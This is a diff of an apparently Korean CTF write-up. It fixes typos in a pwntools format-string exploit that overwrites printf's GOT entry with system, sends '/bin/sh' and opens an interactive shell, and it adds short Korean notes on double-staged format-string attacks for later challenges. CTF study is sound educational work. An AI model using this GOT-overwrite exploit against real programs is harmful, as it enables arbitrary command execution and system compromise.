@@ -63,6 +63,7 @@ payload += p64(e.got["exit"])
 p.send(payload)
 
 
+
 p.recvuntil(b"\n\n")
 payload = f'%{e.symbols["system"] >> 16}c'.encode() #system_high
 payload += b"%10$hn"
@@ -70,11 +71,11 @@ payload += f"%{(e.symbols['system'] & 0xffff) - (e.symbols['system'] >> 16)}c".e
 payload += b"%11$hn"
 payload = payload.ljust(0x20, b"\x00")
 payload += p64(e.got["printf"] + 2)
-payload += p64(e.got['printf"])
+payload += p64(e.got["printf"])
 p.send(payload)
 
 
-p.send('/bin/sh\x00')
+p.send(b'/bin/sh\x00')
 
 
 p.interactive()
@@ -201,10 +202,12 @@ p.interactive()
 
 ## oneshot3
 
-새로운 문제이다.
+exit 함수가 존재하지 않으므로 다른 방식의 fsb를 해야 한다.
 
 
 
 
 
 ## oneshot4
+
+전역변수 buf에 입력을 받는 상황이기 때문에 double-staged fsb를 해야 한다.
